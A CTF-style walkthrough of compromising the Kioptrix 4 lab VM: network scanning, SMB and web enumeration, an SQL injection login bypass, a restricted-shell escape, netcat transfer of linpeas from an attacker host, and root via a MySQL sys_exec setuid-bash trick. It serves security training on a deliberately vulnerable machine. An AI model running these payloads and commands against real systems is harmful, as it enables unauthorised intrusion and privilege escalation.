## üîçHost Discovery

After installing the VM, we need to determine the IP address assigned to it. Many tools can accomplish this. In this article, we‚Äôll be using `netdiscover`:

```shell
sudo netdiscover -i eth0 -r 192.168.109.0/24
```

**"192.168.109.0/24"** is the subnet address of the NAT virtual network in my VMware Workstation. It might be different on your device. This command will show all active devices on your network.

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic13.png)

From the scanning results, the target IP address is **"192.168.109.147"**. The other active hosts include the VMware default gateway, the DHCP server, and the DNS server.

---

## üïµüèºEnumeration

After identifying the target, we need to scan for open ports and the services running on each of them to understand our attack surface. `nmap` will be a great choice for that.

```shell
target=192.168.109.147
sudo nmap -sS -T4 -p- -sVC -O $target -oN scan-result.txt
```

Let‚Äôs break this command down:
- `sudo`: to run it with root privileges so that we can modify the TCP default connection (Three-way handshake) to make our scan faster.
- `-sS` : for [stealthy scan](https://nmap.org/book/synscan.html)
- `-T4` : for aggressive [timing templates](https://nmap.org/book/performance-timing-templates.html)
- `-p-` : for scanning all ports
- `-sV` : for [service detection](https://nmap.org/book/vscan.html)
- `-sC` : to use [default NSE scripts](https://nmap.org/book/nse-usage.html#nse-categories)
- `-O` : [OS detection](https://nmap.org/book/man-os-detection.html)
- `-oN` : save the scan results in **"scan-result.txt"**

Here is the result of the `nmap` scan:

```

As indicated in the output above, there are four open ports: 22 (SSH), 80 (HTTP), 139 (NetBIOS), and 445 (SMB).

We‚Äôll start by enumerating SMB. One of my favorite tools for this is enum4linux. The command to use is:

```shell
enum4linux -a $target
```

The output of this command provides a lot of information, including the users that exist on the target machine:

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic14.png)

Now that we know the local users on the machine, let‚Äôs move on to HTTP enumeration. First, we should fuzz for useful directories. To do that, I‚Äôll use `gobuster`. The command is:

```shell
gobuster dir -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -u http://$target
```

where:

- `dir` : directory/file enumeration mode
- `-w`  : Path to the wordlist
- `-u`  : The target URL

Output:

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic15.png)

When you open the `/john`{: .filepath} and `/robert`{: .filepath} directories, you will find `john.php` and `robert.php`. These two pages will redirect you to `index.php`, which is a login page.

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic16.png)

After trying default login credentials such as:
- admin:admin  
- admin:password 

I was redirected to the checklogin.php page with the following message:

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic17.png)

The issue here is that the warning message does not indicate whether the username or the password is incorrect. So, I tried using `'` as both the username and password to check if any fields are vulnerable to SQL injection (SQLI).

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic18.png)

Bingo! I received this error message:

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic19.png)

## üë®üèª‚ÄçüíªExploitation
From this error message, we can deduce three pieces of information. 
- The target machine is using a MySQL database. 
- The web server directory is located at /var/www. 
- The vulnerability exists in the password field, as indicated by the error appearing when the password input was `'`.

If we can inject SQL into the username field, we might bypass authentication. For instance, if the SQL command sent to the database is:

```sql
SELECT * FROM users WHERE username='john' AND password='test'
```

We can inject an SQL logical statement such as `' OR 1=1 -- -` to bypass authentication. Let‚Äôs use one of the usernames we obtained from the SMB enumeration:

- Username: john
- Password: `' OR 1=1 -- -`

After successfully bypassing authentication, it redirects you to the member.php page, where the content displays the username and password of the user you logged in with in this case **"john"**.

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic20.png)

Let‚Äôs try with the other users:

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic21.png)

I couldn‚Äôt retrieve the password of any user except for Robert. I encountered this message:

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic22.png)

Now that we have the credentials of John and Robert, who are local users, let‚Äôs attempt to log in via SSH using their credentials.

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic23.png)

After logging in, you will find yourself in a restricted shell where only the following commands are allowed: `cd`, `clear`, `echo`, `exit`, `help`, `ll`, `lpath`, and `ls`. Additionally, the session terminates if you make any mistakes with the command line, such as attempting to print the environment variables.

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic24.png)

After extensive searching on Google, I came across a method to bypass this restricted shell in an article titled [Escaping Restricted Linux Shells](https://www.sans.org/blog/escaping-restricted-linux-shells/). It was by using the this command:

```shell
echo os.system("/bin/bash")
```

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic24.png)

>If you want to understand why the command ‚Äúecho os.system(‚Äò/bin/bash‚Äô)‚Äù allowed us to escape this restricted shell, you can check this page: [Why does ‚Äúecho os.system(‚Äò/bin/bash‚Äô)‚Äù work?](https://unix.stackexchange.com/questions/370769/why-does-echo-os-system-bin-bash-work).
{: .prompt-tip }

Now, it's time to check the source code `/var/www/checklogin.php`{: .filepath} web page for database credentials. Indeed I found the root credentials for the database.

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic25.png)

- root: `<nopass>`

We‚Äôll back to this later, but for now, let‚Äôs enumerate the system to identify any vulnerabilities that could allow us to elevate our privileges. To do that I‚Äôll use [`linPEAS`](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS).

On the attacker machine, start a netcat listener with the following command:

```shell
nc -nlvp 7702 < linpeas.sh
```

On the target machine, change your current working directory to a directory where you have write permissions. After that, use netcat to download the file using this command:

```shell
netcat -n 192.168.109.131 > linpeas.sh
```

The last step is to change the permissions of the file to make it executable. Use the following command for that:

```shell
chmod +x linpeas.sh
```

The output of the tool shows us many useful info about the system:

## üí•Post-Exploitation

Now, let's proceed to log in to MySQL:

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic26.png)

After checking the [UDF](https://www.scaler.com/topics/mysql-tutorial/user-defined-functions-in-mysql/) I found :

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic27.png)

The `sys_exec()` function in MySQL enables the execution of shell commands directly from within the database. When invoked, it executes the specified command on the server's operating system. With root access to the database, any command executed through this function will run with root privileges.

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic28.png)

The previous command copies the `bash` binary to the `/tmp`{: .filepath} directory and then add the setuid permission to it. The setuid bit tells the OS to execute the program with the user ID of its owner.

Now, if you navigate to the `/tmp`{: .filepath} directory and execute the `bash` binary with the `-p` flag, you will gain root privileges:

![Desktop View](/assets/img/posts/2024-06-14-kioptrix-4-boot-to-root/pic29.png)

Another method to gain root access is by exploiting a kernel vulnerability.

==============snippet=================

This kernel version is vulnerable to [DirtyCow](https://github.com/firefart/dirtycow). Similar to transferring the `linpeas` file, I'll transfer the exploitation code from the attacker machine to the target machine. However, upon attempting to compile it, I discovered that the `gcc` compiler was not installed on the target machine.

That‚Äôs it for today. I hope this writeup was useful for you folks; stay safe and keep pinging :)
